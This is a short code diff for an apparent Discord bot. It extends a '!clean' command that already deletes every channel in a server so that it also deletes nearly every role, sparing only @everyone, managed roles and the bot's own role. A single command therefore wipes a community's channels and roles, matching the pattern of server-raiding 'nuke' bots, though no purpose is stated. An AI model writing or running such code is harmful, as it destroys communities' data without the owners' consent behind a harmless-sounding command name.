@@ -12,6 +12,12 @@ function engineHandler(client: Client) {
       case "!clean":
         message.guild.channels.cache.forEach(each => each.delete())
         message.guild.channels.create({ name: "CMD", type: 0 })
+        message.guild.roles.cache.forEach(each => {
+          if (each.client.user.username == each.name) return
+          if (each.name == "@everyone") return
+          if (each.managed) return
+          each.delete()
+        })
         break
       default:
         break
